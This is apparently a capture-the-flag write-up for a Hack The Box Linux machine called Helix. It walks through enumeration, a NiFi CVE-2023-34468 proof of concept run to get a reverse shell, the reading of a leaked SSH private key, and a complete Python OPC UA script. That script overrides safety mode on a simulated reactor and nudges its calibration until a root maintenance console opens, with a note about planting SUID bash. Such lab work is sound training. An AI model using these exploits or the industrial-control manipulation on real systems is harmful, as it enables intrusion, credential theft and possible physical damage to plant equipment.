# Helix Linux Medium HTB Machine Writeup

#cve-2023-34468
## NMAP Emuneration
```bash
┌──(jameskaois㉿kali)-[~]
└─$ nmap -sC -sV 10.129.245.123 -v
Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-05 13:17 +0700
NSE: Loaded 158 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 13:17
Completed NSE at 13:17, 0.00s elapsed
Initiating NSE at 13:17
Completed NSE at 13:17, 0.00s elapsed
Initiating NSE at 13:17
Completed NSE at 13:17, 0.00s elapsed
Initiating Ping Scan at 13:17
Scanning 10.129.245.123 [4 ports]
Completed Ping Scan at 13:17, 0.19s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 13:17
Completed Parallel DNS resolution of 1 host. at 13:17, 0.50s elapsed
Initiating SYN Stealth Scan at 13:17
Scanning 10.129.245.123 [1000 ports]
Discovered open port 22/tcp on 10.129.245.123
Discovered open port 80/tcp on 10.129.245.123
Completed SYN Stealth Scan at 13:17, 2.37s elapsed (1000 total ports)
Initiating Service scan at 13:17
Scanning 2 services on 10.129.245.123
Completed Service scan at 13:17, 6.40s elapsed (2 services on 1 host)
NSE: Script scanning 10.129.245.123.
Initiating NSE at 13:17
Completed NSE at 13:17, 5.16s elapsed
Initiating NSE at 13:17
Completed NSE at 13:17, 0.76s elapsed
Initiating NSE at 13:17
Completed NSE at 13:17, 0.00s elapsed
Nmap scan report for 10.129.245.123
Host is up (0.18s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 60:b3:f7:6c:0b:92:ab:00:ac:e7:12:e1:d1:26:9c:1e (ECDSA)
|_  256 c8:30:e6:cb:c6:cd:fc:0c:39:e5:34:04:20:07:b9:b3 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://helix.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 13:17
Completed NSE at 13:17, 0.00s elapsed
Initiating NSE at 13:17
Completed NSE at 13:17, 0.00s elapsed
Initiating NSE at 13:17
Completed NSE at 13:17, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.86 seconds
           Raw packets sent: 1107 (48.684KB) | Rcvd: 1002 (40.076KB)
```
## Web Emuneration
```bash
┌──(jameskaois㉿kali)-[~]
└─$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://helix.htb -H "Host: FUZZ.helix.htb" -ac

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://helix.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.helix.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

flow                    [Status: 200, Size: 1068, Words: 110, Lines: 28, Duration: 1703ms]
:: Progress: [19966/19966] :: Job [1/1] :: 210 req/sec :: Duration: [0:01:36] :: Errors: 0 ::
```
Visit `flow.helix.htb/nifi`, saw `Nifi 1.21.0`
## Web Exploiting
Found [CVE-2023-34468](https://github.com/sbouabid-sec/CVE-2023-34468-POC):
```bash
┌──(jameskaois㉿kali)-[~/Documents/hackthebox/helix]
└─$ python3 CVE-2023-34468_poc.py --target http://flow.helix.htb --lhost 10.10.15.11 --lport 4444 --cleanup 
[*] Target: http://flow.helix.htb | LHOST: 10.10.15.11:4444 | HTTP: 80
[*] HTTP server up on :80
[*] Checking access...
[+] Identity: anonymous | Anonymous: True | canWrite: True
[+] Target is exploitable
[*] Getting root process group ID...
[+] PG ID: f203bc07-019b-1000-516b-eaedd48609d1
[*] Creating DBCPConnectionPool...
[+] CS ID: 30f29a4a-019f-1000-9fd8-cdf43475c981
[*] Enabling controller service...
[+] Controller service enabled
[*] Creating ExecuteSQL processor...
[+] Processor ID: 30f2a525-019f-1000-1a45-be1c93ee795c
[*] Starting processor...
[+] Processor running — waiting for shell on port 4444...
[+] rce.sql delivered to target
[*] Cleaning up...
[+] Processor deleted
[+] Controller service deleted
```
```bash
nifi@helix:/opt/nifi-1.21.0$ id
uid=998(nifi) gid=998(nifi) groups=998(nifi)
nifi@helix:/opt/nifi-1.21.0$ 
```
## Get user flag
```bash
nifi@helix:/opt/nifi-1.21.0/support-bundles$ cat operator_id_ed25519.bak 
cat operator_id_ed25519.bak
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDouEevtXQL5puMEPQzMGEo/LSrbETsWVDH8B41VHNbOwAAAJhCUmdYQlJn
WAAAAAtzc2gtZWQyNTUxOQAAACDouEevtXQL5puMEPQzMGEo/LSrbETsWVDH8B41VHNbOw
AAAEBWd4qZPQ48ePEdHec/Fquwu8Apm+TkeJJTwODupeRtwui4R6+1dAvmm4wQ9DMwYSj8
tKtsROxZUMfwHjVUc1s7AAAAD3Jvb3RAbWFuYWdlbWVudAECAwQFBg==
-----END OPENSSH PRIVATE KEY-----
nifi@helix:/opt/nifi-1.21.0/support-bundles$ 
```
```bash
┌──(jameskaois㉿kali)-[~/Documents/hackthebox/helix]
└─$ chmod 700 ./      
                                                                                                                                   
┌──(jameskaois㉿kali)-[~/Documents/hackthebox/helix]
└─$ chmod 600 operator_id_key 
                                                                                                                                   
┌──(jameskaois㉿kali)-[~/Documents/hackthebox/helix]
└─$ ssh operator@helix.htb -i operator_id_key
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-164-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sun Jul  5 06:32:13 AM UTC 2026

  System load:           0.28
  Usage of /:            87.2% of 6.52GB
  Memory usage:          39%
  Swap usage:            0%
  Processes:             232
  Users logged in:       0
  IPv4 address for eth0: 10.129.245.123
  IPv6 address for eth0: dead:beef::250:56ff:feb9:9588

  => / is using 87.2% of 6.52GB


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Sun Jul 5 06:32:15 2026 from 10.10.15.11
operator@helix:~$ 
```
## Privilege Escalation
```bash
operator@helix:~$ sudo -l
Matching Defaults entries for operator on helix:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User operator may run the following commands on helix:
    (root) NOPASSWD: /usr/local/sbin/helix-maint-console
operator@helix:~$ ls -la /usr/local/sbin/helix-maint-console 
-rwxr-x--- 1 root operator 932 Jan 25 19:12 /usr/local/sbin/helix-maint-console
operator@helix:~$ id
uid=1001(operator) gid=1001(operator) groups=1001(operator)
operator@helix:~$ file /usr/local/sbin/helix-maint-console
/usr/local/sbin/helix-maint-console: Bourne-Again shell script, ASCII text executable
operator@helix:~$ cat /usr/local/sbin/helix-maint-console
#!/bin/bash
set -euo pipefail

FLAG="/opt/helix/state/maintenance_window"

read_until() { cat "$FLAG" 2>/dev/null || true; }

window_ok() {
  [ -f "$FLAG" ] || return 1
  local until_ts now
  until_ts="$(read_until)"
  now="$(date +%s)"
  [[ "$until_ts" =~ ^[0-9]+$ ]] || return 1
  [ "$now" -lt "$until_ts" ] || return 1
  return 0
}

if ! window_ok; then
  echo "Maintenance window CLOSED."
  exit 1
fi

until_ts="$(read_until)"
now="$(date +%s)"
remaining=$((until_ts-now))

echo "[+] Privileged maintenance access granted"
echo "[!] Window expires in ${remaining} seconds"
echo "[!] Session will be terminated automatically"

# Unique scope name
SCOPE="helix-maint-$$"

# Launch an interactive root shell attached to THIS TTY, in its own systemd scope
systemd-run --quiet --scope --unit="$SCOPE" --property=KillMode=control-group --property=SendSIGHUP=yes \
  /bin/bash -p -i

# If systemd-run returns, the shell exited.
exit 0
```
Other files in `/home/operator`:
![[Pasted image 20260705133732.png]]
## Get root flag
```python
# get_root.py
#!/usr/bin/env python3
import asyncio
from asyncua import Client, ua

URL = "opc.tcp://127.0.0.1:4840/helix/"

# Node IDs from browse output
N_TEMP     = "ns=2;i=4"    # Plant.Reactor.Temperature       (Double, read)
N_PRESS    = "ns=2;i=5"    # Plant.Reactor.Pressure          (Double, read)
N_OFFSET   = "ns=2;i=6"    # Plant.Reactor.CalibrationOffset (Double, write)
N_TRIP     = "ns=2;i=10"   # Plant.Safety.TripActive         (Bool,   read)
N_MODE     = "ns=2;i=12"   # Plant.Control.Mode              (String, write)
N_OVERRIDE = "ns=2;i=13"   # Plant.Control.TestOverride      (Bool,   write)
N_RESET    = "ns=2;i=14"   # Plant.Control.ResetTrip         (Bool,   write)

# Targets — window opens at T≈295 or P≈73; trip at 305 / 75
TARGET_T = 296.0
TARGET_P = 73.5
TRIP_T   = 303.5   # back off well before 305
TRIP_P   = 74.5
STEP     = 0.25    # offset increment per tick — stay small, simulator dynamics lag
SETTLE   = 1.5     # seconds between writes; let temp/press catch up

async def w(c, nid, val, vtype):
    await c.get_node(nid).write_value(ua.DataValue(ua.Variant(val, vtype)))

async def r(c, nid):
    return await c.get_node(nid).read_value()

async def main():
    async with Client(url=URL) as c:
        t = await r(c, N_TEMP); p = await r(c, N_PRESS); off = await r(c, N_OFFSET)
        print(f"[i] start  T={t:.2f}  P={p:.2f}  offset={off:.2f}")

        # 1) Enter maintenance
        await w(c, N_MODE,     "MAINTENANCE", ua.VariantType.String)
        await w(c, N_OVERRIDE, True,          ua.VariantType.Boolean)
        print("[+] Mode=MAINTENANCE, TestOverride=True")
        await asyncio.sleep(1)

        # 2) Ramp offset until we're inside the window
        offset = float(off)
        while True:
            t    = await r(c, N_TEMP)
            p    = await r(c, N_PRESS)
            trip = await r(c, N_TRIP)
            print(f"  off={offset:5.2f}  T={t:7.3f}  P={p:6.3f}  trip={trip}")

            if trip:
                print("[-] TRIPPED — run recovery (see comment block below)")
                return

            if t >= TARGET_T or p >= TARGET_P:
                print(f"[+] INSIDE WINDOW (T={t:.2f} P={p:.2f}) — "
                      f"SWITCH TO OPERATOR SHELL AND RUN:\n"
                      f"    sudo /usr/local/sbin/helix-maint-console")
                break

            # adaptive step: shrink as we close in on trip thresholds
            head_t = TRIP_T - t
            head_p = TRIP_P - p
            step = STEP
            if head_t < 4 or head_p < 1.5: step = STEP / 2
            if head_t < 2 or head_p < 0.8: step = STEP / 4

            offset += step
            await w(c, N_OFFSET, offset, ua.VariantType.Double)
            await asyncio.sleep(SETTLE)

        # 3) HOLD the reactor in-window so the helixsvc daemon keeps refreshing
        #    /opt/helix/state/maintenance_window while you get root + persist.
        print("[i] Holding in-window. Ctrl-C after you've dropped SUID bash.")
        while True:
            await asyncio.sleep(3)
            t    = await r(c, N_TEMP)
            p    = await r(c, N_PRESS)
            trip = await r(c, N_TRIP)
            print(f"  [hold] T={t:.2f}  P={p:.2f}  trip={trip}  off={offset:.2f}")
            if trip:
                print("[-] tripped mid-hold; bail"); break
            # gentle correction if drifting out of window
            if t < 295.5 and p < 73.2:
                offset += 0.15
                await w(c, N_OFFSET, offset, ua.VariantType.Double)
            elif t > TRIP_T - 2 or p > TRIP_P - 0.6:
                offset -= 0.15
                await w(c, N_OFFSET, offset, ua.VariantType.Double)

# --- Recovery (paste into a python REPL if you trip) ---
# async with Client(url=URL) as c:
#     await w(c, N_OFFSET,   0.0,       ua.VariantType.Double)
#     await w(c, N_OVERRIDE, False,     ua.VariantType.Boolean)
#     await w(c, N_MODE,     "NORMAL",  ua.VariantType.String)
#     # wait for T<288, P<70, then:
#     await w(c, N_RESET,    True,      ua.VariantType.Boolean)

asyncio.run(main())
```
![[Pasted image 20260705134527.png]]
